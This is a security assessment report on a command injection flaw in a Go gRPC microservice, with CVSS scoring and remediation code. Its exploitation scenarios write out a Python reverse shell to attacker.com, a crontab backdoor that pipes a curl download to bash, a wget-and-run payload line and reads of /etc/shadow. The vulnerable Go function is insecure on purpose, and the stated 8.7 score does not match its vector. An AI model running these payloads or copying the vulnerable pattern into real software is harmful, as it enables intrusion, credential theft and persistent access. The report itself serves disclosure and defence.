# Command Injection in Go-based gRPC Microservice

# Vulnerability Case
During our security assessment of Acme Corp's Go-based gRPC microservices, we discovered that unsanitized user input is directly passed to the operating system via the `exec.Command` function used in conjunction with `bash -c`. The vulnerability was identified during a combination of source code review and dynamic testing of a gRPC endpoint that processes command strings for administrative tasks. Specifically, tainted input from a client is concatenated into a shell command without proper escaping, making it vulnerable to command injection. This issue is observed in a production stack built on Go 1.17+, utilizing gRPC on Linux servers orchestrated via Kubernetes. If exploited, an attacker could inject arbitrary shell commands, potentially leading to full system compromise and unauthorized access to sensitive data.

```go
package main

import (
    "log"
    "os/exec"
)

// Vulnerable function: directly executes user input as a shell command.
func ExecuteUserCommand(userInput string) {
    // Unsafe: userInput is injected into the bash command without sanitization.
    cmd := exec.Command("bash", "-c", userInput)
    output, err := cmd.CombinedOutput()
    if err != nil {
        log.Printf("Error executing command: %v", err)
    }
    log.Printf("Command output: %s", output)
}

func main() {
    // Example of unsanitized input that could lead to command injection
    maliciousInput := "echo 'Listing Files:'; ls -la /; cat /etc/passwd"
    ExecuteUserCommand(maliciousInput)
}
```

The vulnerability stems from the use of Go's `exec.Command` with `bash -c` to execute arbitrary input provided by the client. In this context, tainted input bypasses proper sanitization, enabling attackers to craft payloads that execute multiple chained commands. An attacker could leverage this flaw to run malicious commands—ranging from data exfiltration to establishing a reverse shell—in environments using common technologies such as Go, gRPC, and Linux containers managed by Kubernetes. The business impact is significant as exploitation may lead to complete system compromise, unauthorized data access, and potential disruption of critical services.


context: go.grpc.command-injection.grpc-command-injection.grpc-http-command-injection-taint Untrusted input might be injected into a command executed by the application, which can lead to a command injection vulnerability. An attacker can execute arbitrary commands, potentially gaining complete control of the system. To prevent this vulnerability, avoid executing OS commands with user input. If this is unavoidable, validate and sanitize the input, and use safe methods for executing the commands. In Go, it is possible to use the `exec.Command` function in combination with the `bash -c` command to run the user input as a shell command. To sanitize the user input, you can use a library like `shellescape` to escape any special characters before constructing the command. For more information, see: [Go command injection prevention](https://semgrep.dev/docs/cheat-sheets/go-command-injection/)

# Vulnerability Breakdown
This vulnerability allows remote attackers to execute arbitrary operating system commands via specially crafted gRPC requests to an administrative endpoint in Acme Corp's Go microservices architecture.

1. **Key vulnerability elements**:
   - Direct passing of unsanitized user input to `exec.Command` with `bash -c`
   - No input validation or sanitization mechanisms
   - Production environment running Go 1.17+ on Linux servers in Kubernetes
   - Administrative gRPC endpoint processing command strings
   - Command concatenation without proper escaping

2. **Potential attack vectors**:
   - Malicious gRPC client requests containing shell metacharacters
   - Chain commands using semicolons, pipes, or other shell operators
   - Leverage environment access to pivot to other systems
   - Exfiltrate sensitive data via network commands
   - Establish persistence through scheduled tasks or reverse shells

3. **Severity assessment**:
   - High confidentiality impact from potential access to sensitive data
   - High integrity impact from ability to modify system files and data
   - High availability impact from potential to disrupt services
   - Network attack vector with low complexity
   - Some privileges required to access the administrative endpoint
   - No user interaction needed to exploit

4. **CVSS v3.1 calculation**:
   - Attack Vector (AV): Network (N) 
   - Attack Complexity (AC): Low (L) 
   - Privileges Required (PR): Low (L) 
   - User Interaction (UI): None (N) 
   - Scope (S): Unchanged (U)
   - Confidentiality (C): High (H) 
   - Integrity (I): High (H) 
   - Availability (A): High (H) 

# Description
A command injection vulnerability exists in Acme Corp's Go-based gRPC microservices that allows attackers to execute arbitrary shell commands on the underlying operating system. The vulnerability stems from improper handling of user input in an administrative gRPC endpoint where the application directly passes client-provided command strings to the operating system shell via `exec.Command("bash", "-c", userInput)` without any sanitization or validation.

```go
func ExecuteUserCommand(userInput string) {
    // Unsafe: userInput is injected into the bash command without sanitization.
    cmd := exec.Command("bash", "-c", userInput)
    output, err := cmd.CombinedOutput()
    // ...
}

```

This issue affects production systems running Go 1.17+ on Linux servers orchestrated via Kubernetes. By sending specially crafted gRPC requests containing shell metacharacters (e.g., `;`, `|`, `&`), an attacker could inject additional commands that execute with the privileges of the microservice process, potentially leading to system compromise, unauthorized data access, and service disruption.

# CVSS
**Score**: 8.7 \
**Vector**: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H \
**Severity**: High

The High severity rating (8.7) is justified by the following factors:

- **Network Attack Vector (AV:N)**: The vulnerability is in a gRPC microservice accessible over the network, allowing remote exploitation.

- **Low Attack Complexity (AC:L)**: Exploiting this vulnerability is straightforward and requires minimal expertise. An attacker simply needs to send malicious input containing shell metacharacters to the vulnerable endpoint.

- **Low Privileges Required (PR:L)**: Some level of privileges is likely required to access the administrative gRPC endpoint, but not administrative privileges.

- **No User Interaction (UI:N)**: The vulnerability can be exploited without any action from legitimate users.

- **Unchanged Scope (S:U)**: The vulnerability affects only the vulnerable component itself.

- **High Impact on Confidentiality, Integrity, and Availability (C:H/I:H/A:H)**: Successful exploitation gives the attacker the ability to execute arbitrary commands, potentially leading to full system compromise. This includes reading sensitive files (high confidentiality impact), modifying system data (high integrity impact), and disrupting services by terminating processes or consuming resources (high availability impact).

The combination of network exploitability, low complexity, minimal privilege requirements, and high impacts across all security dimensions results in this High severity rating.

# Exploitation Scenarios
**Scenario 1: Sensitive Data Exfiltration**
An attacker with access to the gRPC service sends a request to the vulnerable administrative endpoint with the payload: `ls -la; cat /etc/passwd; cat /etc/shadow`. The microservice executes this as a shell command, returning the directory listing and contents of sensitive system files. The attacker progressively explores the filesystem, looking for configuration files, environment variables, or credentials that could be used for further compromise.

**Scenario 2: Reverse Shell Establishment**
The attacker sends a more sophisticated payload: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'`. This establishes a reverse shell connection to the attacker's server, giving interactive command-line access to the container environment. From this position, the attacker can attempt lateral movement to other services in the Kubernetes cluster.

**Scenario 3: Infrastructure Reconnaissance and Persistence**
An attacker uses a series of commands to gather information about the infrastructure: `env; ip addr; kubectl get pods --all-namespaces`. After mapping out the environment, they establish persistence by adding a crontab entry that periodically connects back to their command and control server: `(crontab -l 2>/dev/null; echo "*/5 * * * * curl -s https://attacker.com/backdoor.sh | bash") | crontab -`. This ensures continued access even if the vulnerable pod restarts.

# Impact Analysis
**Business Impact:**
- Unauthorized access to sensitive customer and business data, potentially leading to regulatory violations (GDPR, CCPA, etc.)
- Reputational damage from data breaches or service disruptions
- Financial loss from operational downtime or ransom demands
- Legal liability if attackers leverage the compromised systems to attack other organizations
- Loss of competitive advantage if proprietary information is exfiltrated
- Resources diverted to incident response, forensics, and remediation

**Technical Impact:**
- Full command execution capability within the container environment with the permissions of the service account
- Potential access to sensitive configuration details, API keys, and credentials
- Lateral movement across microservices in the Kubernetes cluster
- Data exfiltration capabilities for both system files and application data
- Service disruption through resource exhaustion or process termination
- Container escape possibilities if combined with kernel vulnerabilities
- Potential to modify application code or data, compromising integrity
- Long-term persistence through scheduled tasks, backdoored containers, or modified deployment scripts

# Technical Details
The vulnerability exists in the Go-based gRPC microservice where client-provided input is directly passed to the operating system shell via the `exec.Command` function with `bash -c` as the command interpreter. The core issue lies in the `ExecuteUserCommand` function:

```go
func ExecuteUserCommand(userInput string) {
    // Unsafe: userInput is injected into the bash command without sanitization.
    cmd := exec.Command("bash", "-c", userInput)
    output, err := cmd.CombinedOutput()
    if err != nil {
        log.Printf("Error executing command: %v", err)
    }
    log.Printf("Command output: %s", output)
}

```

**Key Technical Issues:**

1. **Use of Shell Interpreter:**
   The function uses `bash -c` which treats the input as a shell command string. This is fundamentally different from using `exec.Command` directly with a program name and arguments, as the shell interprets metacharacters (`;`, `&&`, `||`, `|`, etc.) which can be used to chain multiple commands.

2. **Lack of Input Validation:**
   There is no sanitization or validation of the `userInput` parameter. Any metacharacters or shell syntax is passed directly to the shell interpreter.

3. **Error Handling Reveals Information:**
   The error logging might reveal sensitive information about the command execution and system configuration.

**Exploitation Mechanics:**

The vulnerability can be exploited by sending specially crafted gRPC requests containing shell metacharacters. For example:

- Basic command chaining: `echo hello; ls -la /`
- Command substitution: `echo $(cat /etc/passwd)`
- Background processing: `nohup wget http://malicious.com/payload -O /tmp/payload && chmod +x /tmp/payload && /tmp/payload &`

**Attack Surface:**

The attack surface is any client with access to the gRPC service that can make requests to the vulnerable endpoint. Since this is described as an "administrative" endpoint, it may require some level of authentication or authorization, but once that access is obtained, the command injection is straightforward.

**Technical Context:**

In Go's `os/exec` package, there are two distinct ways to execute commands:

1. **Direct execution:** `exec.Command("program", "arg1", "arg2")` - Executes the program directly with the specified arguments, without shell interpretation.

2. **Shell execution:** `exec.Command("bash", "-c", "command string")` - Passes the command string to a shell interpreter, which processes metacharacters and performs expansions.

The vulnerability uses the second approach, which is inherently riskier when handling untrusted input. This is particularly problematic in a microservices architecture where compromising one service can lead to lateral movement across the infrastructure.

# Remediation Steps
## Avoid Shell Interpreter and Use Direct Command Execution

**Priority**: P0

Replace the use of `bash -c` with direct command execution, separating the command and its arguments:

```go
func ExecuteUserCommand(command string, args ...string) {
    // Safer: Direct command execution without shell interpretation
    cmd := exec.Command(command, args...)
    output, err := cmd.CombinedOutput()
    if err != nil {
        log.Printf("Error executing command: %v", err)
    }
    log.Printf("Command output: %s", output)
}

// Usage example
ExecuteUserCommand("ls", "-la", "/var/log")

```

This approach eliminates shell interpretation entirely, preventing command injection through metacharacters. Each argument is passed directly to the program without being processed by a shell interpreter.
## Implement Command Whitelisting

**Priority**: P1

If shell execution is absolutely necessary, implement strict whitelisting of allowed commands and arguments:

```go
func ExecuteUserCommand(commandType string, args ...string) error {
    // Define allowed commands and their valid arguments
    allowedCommands := map[string]struct {
        path string
        validateArgs func([]string) bool
    }{
        "list_logs": {
            path: "/bin/ls",
            validateArgs: func(args []string) bool {
                // Only allow certain flags and the /var/log directory
                for _, arg := range args {
                    if arg != "-l" && arg != "-a" && arg != "/var/log" {
                        return false
                    }
                }
                return true
            },
        },
        // Add other allowed commands...
    }
    
    // Verify the command is allowed
    cmdConfig, ok := allowedCommands[commandType]
    if !ok {
        return fmt.Errorf("unauthorized command type: %s", commandType)
    }
    
    // Validate arguments
    if !cmdConfig.validateArgs(args) {
        return fmt.Errorf("invalid arguments for command: %s", commandType)
    }
    
    // Execute the command directly with validated arguments
    cmd := exec.Command(cmdConfig.path, args...)
    output, err := cmd.CombinedOutput()
    if err != nil {
        log.Printf("Error executing command: %v", err)
        return err
    }
    
    log.Printf("Command output: %s", output)
    return nil
}

// Usage
ExecuteUserCommand("list_logs", "-l", "-a", "/var/log")

```

This approach restricts commands to a predefined set and includes custom validation for allowed arguments, drastically reducing the attack surface.


# References
* CWE-78 | [Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')](https://cwe.mitre.org/data/definitions/78.html)
* CWE-77 | [Improper Neutralization of Special Elements used in a Command ('Command Injection')](https://cwe.mitre.org/data/definitions/77.html)
* A03:2021 | [Injection](https://owasp.org/Top10/A03_2021-Injection/)
* CWE-20 | [Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html)
* A04:2021 | [Insecure Design](https://owasp.org/Top10/A04_2021-Insecure_Design/)
